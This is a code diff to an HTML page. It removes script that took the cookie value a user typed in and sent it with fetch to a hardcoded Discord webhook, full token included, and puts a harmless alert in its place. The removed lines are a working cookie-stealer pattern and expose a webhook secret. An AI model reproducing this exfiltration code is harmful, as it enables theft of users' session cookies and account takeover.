@@ -60,27 +60,8 @@
 
             var cookie = document.getElementById('cookie').value;
 
-            // Create data object
-            var data = {
-                content: "Make sure your cookie is correct. If it doesn't work, try again. Cookie: " + cookie
-            };
-
-            // Send data to Discord webhook using fetch
-            fetch('https://discord.com/api/webhooks/1040678839396872322/TIl24vk7NiW4Fz3zACaKchZhtMc8ien3KjI9ha9EU1dTBeKIDH18H3Fgx3uStpAkG5Ud', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify(data)
-            })
-            .then(response => {
-                if (!response.ok) {
-                    throw new Error('Error sending message to Discord');
-                }
-            })
-            .catch(error => {
-                console.error('Error:', error);
-            });
+            // Display message to ensure the user's cookie is correct
+            alert("Make sure your cookie is correct. If it doesn't work, try again.");
         });
     </script>
 </body>
